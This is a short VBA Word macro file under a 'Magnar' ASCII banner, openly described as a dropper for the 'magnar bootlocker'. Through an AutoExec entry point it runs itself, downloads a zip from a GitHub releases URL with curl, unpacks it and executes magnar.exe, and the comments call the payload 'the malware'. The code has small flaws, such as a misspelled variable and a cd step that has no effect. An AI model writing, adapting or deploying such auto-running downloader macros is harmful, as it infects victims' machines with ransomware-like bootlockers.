' This file contains the word macro that should be able to install and rum the magnar bootlocker autonomous
'                                                                                                                           
'MMMMMMMM               MMMMMMMM                                                                                            
'M:::::::M             M:::::::M                                                                                            
'M::::::::M           M::::::::M                                                                                            
'M:::::::::M         M:::::::::M                                                                                            
'M::::::::::M       M::::::::::M  aaaaaaaaaaaaa     ggggggggg   gggggnnnn  nnnnnnnn      aaaaaaaaaaaaa  rrrrr   rrrrrrrrr   
'M:::::::::::M     M:::::::::::M  a::::::::::::a   g:::::::::ggg::::gn:::nn::::::::nn    a::::::::::::a r::::rrr:::::::::r  
'M:::::::M::::M   M::::M:::::::M  aaaaaaaaa:::::a g:::::::::::::::::gn::::::::::::::nn   aaaaaaaaa:::::ar:::::::::::::::::r 
'M::::::M M::::M M::::M M::::::M           a::::ag::::::ggggg::::::ggnn:::::::::::::::n           a::::arr::::::rrrrr::::::r
'M::::::M  M::::M::::M  M::::::M    aaaaaaa:::::ag:::::g     g:::::g   n:::::nnnn:::::n    aaaaaaa:::::a r:::::r     r:::::r
'M::::::M   M:::::::M   M::::::M  aa::::::::::::ag:::::g     g:::::g   n::::n    n::::n  aa::::::::::::a r:::::r     rrrrrrr
'M::::::M    M:::::M    M::::::M a::::aaaa::::::ag:::::g     g:::::g   n::::n    n::::n a::::aaaa::::::a r:::::r            
'M::::::M     MMMMM     M::::::Ma::::a    a:::::ag::::::g    g:::::g   n::::n    n::::na::::a    a:::::a r:::::r            
'M::::::M               M::::::Ma::::a    a:::::ag:::::::ggggg:::::g   n::::n    n::::na::::a    a:::::a r:::::r            
'M::::::M               M::::::Ma:::::aaaa::::::a g::::::::::::::::g   n::::n    n::::na:::::aaaa::::::a r:::::r            
'M::::::M               M::::::M a::::::::::aa:::a gg::::::::::::::g   n::::n    n::::n a::::::::::aa:::ar:::::r            
'MMMMMMMM               MMMMMMMM  aaaaaaaaaa  aaaa   gggggggg::::::g   nnnnnn    nnnnnn  aaaaaaaaaa  aaaarrrrrrr            
'                                                           g:::::g                                                        
'                                                gggggg      g:::::g                                                        
'                                                g:::::gg   gg:::::g                                                        
'                                                 g::::::ggg:::::::g                                                        
'                                                  gg:::::::::::::g                                                         
'                                                    ggg::::::ggg                                                           
'                                                       gggggg     
'
'
Attribute VB_Name = "AutoExec"
Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoExec"
    
    ' cd c:\user\desktop
    Dim Dekstop
    Desktop = Shell("cd %USERPROFILE%/Desktop", 1)
    
    ' download the exe file from releases page
    Dim RetVal
    RetVal = Shell("curl -LJO https://github.com/magnar-blj/magnar/releases/download/v3.00/magnar.zip", 1)
    
    ' Unzip the malware
    Dim Unzip
    Unzip = Shell("tar -zxf magnar.zip", 1)
    
    ' execute the malware
    Dim Exec
    Exec = Shell("magnar.exe", 1)
    ' BoOm biG BlAst!!!!
End Sub
